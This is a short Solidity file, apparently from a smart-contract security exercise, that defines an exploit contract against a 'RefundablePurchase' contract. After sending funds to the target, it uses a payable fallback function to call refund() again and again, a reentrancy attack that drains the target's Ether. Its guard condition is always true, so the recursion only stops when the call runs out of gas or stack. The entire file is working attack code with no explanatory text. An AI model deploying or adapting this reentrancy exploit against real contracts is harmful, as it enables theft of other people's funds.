pragma solidity ^ 0.4.24;

/** Exploit contract for RefundablePurchase
 */

import './RefundablePurchase.sol';

contract RefundExploit {
    RefundablePurchase rp;
    
    constructor(address target) public {
        rp = RefundablePurchase(target);
    }
    
    function payContract() payable public {
        rp.call.value(msg.value)("");
    }
    
    function exploit() payable public {
        rp.refund();
    }
    
    function () payable public {
        if(address(rp).balance >= 0) {
            rp.refund();
        }
    }
}